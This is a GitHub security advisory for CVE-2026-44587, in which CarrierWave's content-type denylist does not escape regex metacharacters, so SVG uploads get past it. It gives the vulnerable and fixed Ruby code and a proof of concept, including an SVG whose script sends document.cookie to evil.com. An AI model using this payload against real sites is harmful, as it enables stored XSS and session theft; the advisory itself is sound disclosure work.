# [M] CarrierWave has a denylisted_content_type bypass via Unescaped Regex Metacharacters

## Summary
Severity: Medium
Advisory: GHSA-7g26-2qgj-chfg
CVE: CVE-2026-44587
CWE: CWE-116, CWE-79
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-7g26-2qgj-chfg
Type: github-advisory

## Affected
- RubyGems: `carrierwave` — affected >=3.0.0.beta <3.1.3
- RubyGems: `carrierwave` — affected >=0 <2.2.7

## Details
### Summary
CarrierWave's content_type_denylist check fails to escape regex metacharacters in string entries, causing the denylist to silently not match the content types it is intended to block.

**Note**: CarrierWave is aware `#content_type_denylist is deprecated for the security reason`, but it still used by developers, and the problem here isn't denylist allows any filetype, and thats not a  vulnerability in carrierwave, its an implementation problem in developers using CarrierWave, the problem is its denylist entries are interpolated directly into a regex without `Regexp.quote` or anchoring. The denylist is still useful when developers want to ban specific content types but allow everything else.

### Details
In `lib/carrierwave/uploader/content_type_denylist.rb:57`, string denylist entries are interpolated directly into a regex without `Regexp.quote` or anchoring:

```ruby
def denylisted_content_type?(denylist, content_type)
  Array(denylist).any? { |item| content_type =~ /#{item}/ }
end
The entry "image/svg+xml" becomes the regex /image\/svg+xml/ where + is a quantifier meaning "one or more g", not a literal +. This regex never matches the real MIME type "image/svg+xml" which contains a literal +.
This is inconsistent with the allowlist implementation at lib/carrierwave/uploader/content_type_allowlist.rb:53-57, which correctly applies both Regexp.quote and a \A anchor:
rubydef allowlisted_content_type?(allowlist, content_type)
  Array(allowlist).any? do |item|
    item = Regexp.quote(item) if item.class != Regexp
    content_type =~ /\A#{item}/
  end
end
```

Other affected MIME types include `application/xhtml+xml` and any type containing regex metacharacters.

Fix: Apply Regexp.quote for string entries and anchor with \A, matching the existing allowlist implementation:
```
rubydef denylisted_content_type?(denylist, content_type)
  Array(denylist).any? do |item|
    item = Regexp.quote(item) if item.class != Regexp
    content_type =~ /\A#{item}/
  end
end
```

### PoC


```
 app.rb
require "sinatra"
require "carrierwave"
require "fileutils"

FileUtils.mkdir_p("uploads/files")

CarrierWave.configure do |config|
  config.root      = File.expand_path("uploads")
  config.store_dir = "files"
end

class VaultUploader < CarrierWave::Uploader::Base
  storage :file
  def store_dir = "files"
  def content_type_denylist = %w[image/svg+xml]
end

post "/upload" do
  content_type :json
  san = CarrierWave::SanitizedFile.new(
    tempfile:     params[:file][:tempfile],
    filename:     params[:file][:filename],
    content_type: params[:file][:type]
  )
  uploader = VaultUploader.new
  begin
    uploader.store!(san)
    { result: "VULNERABLE", message: "SVG bypassed denylist", path: uploader.path }.to_json
  rescue CarrierWave::IntegrityError => e
    { result: "blocked", message: e.message }.to_json
  end
end
```

```
bundle exec ruby app.rb &

echo '<svg xmlns="http://www.w3.org/2000/svg"><script>document.location="https://evil.com/?c="+document.cookie</script></svg>' > xss.svg

curl -X POST http://localhost:4567/upload \
  -F "file=@xss.svg;type=image/svg+xml"
```

Expected response (denylist working):
```
json{ "result": "blocked", "message": "..." }
```


Actual response:
```
json{ "result": "VULNERABLE", "message": "SVG bypassed denylist", "path": "..." }
```
### Impact
Any application that uses content_type_denylist to block image/svg+xml — the most common use case, specifically to prevent stored XSS — is silently unprotected. An attacker can upload an SVG file containing arbitrary

## References
- https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-7g26-2qgj-chfg
- https://nvd.nist.gov/vuln/detail/CVE-2026-44587
- https://github.com/carrierwaveuploader/carrierwave/commit/21221cc6e260633f7da78c6133a88666a5529d27
- https://github.com/carrierwaveuploader/carrierwave/commit/4c4a005775a436c5165df014dc9b1874c227d86c
- https://github.com/carrierwaveuploader/carrierwave
- https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2026-44587.yml
- https://www.cve.org/CVERecord?id=CVE-2026-44587
